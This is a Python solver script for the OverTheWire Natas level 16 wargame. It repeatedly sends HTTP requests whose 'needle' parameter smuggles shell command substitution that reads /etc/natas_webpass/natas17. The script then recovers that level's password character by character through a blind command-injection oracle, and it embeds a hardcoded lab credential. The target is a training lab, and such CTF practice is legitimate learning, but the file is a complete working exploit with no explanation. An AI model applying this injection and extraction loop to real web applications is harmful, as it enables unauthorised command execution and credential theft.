import requests
from requests.auth import HTTPBasicAuth
import string
import logging

logging.basicConfig(level=logging.DEBUG)
url = "http://natas16.natas.labs.overthewire.org/index.php"

def construct_query(username, password_index, password_char):
    modified_password_index = password_index + 1
    query_template = "$(if [ $(expr substr $(cat /etc/natas_webpass/{username}) {password_index} 1) = {password_char} ]\nthen\n echo shyest\nelse\necho asdfasdfasdfasdf\nfi)"
    #query_template = "${{$(expr substr $(cat /etc/natas_webpass/{username}) {password_index} 1)/{password_char}/shyest}}"
    query = query_template.format(username=username, password_index=modified_password_index,  password_char=password_char)
    return query

def main():
    password_chars = string.ascii_letters + string.digits
    username = "natas17"
    level_username = "natas16"
    level_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
    
    password = ""
    
    for i in range(32):
        for char in password_chars:
            data = construct_query(username,  i,  char)
            logging.debug("Trying query: " + data)
            response = requests.get(url,  params={"needle":data}, auth=HTTPBasicAuth(level_username,  level_password))
            print ("URL: " + response.url)
            logging.debug(response.text)
            if "shyest" in response.text:
                logging.info("Found character: " + char)
                password += char
                break
                
    print("Password is: " +password)
if __name__ == "__main__":
    main()
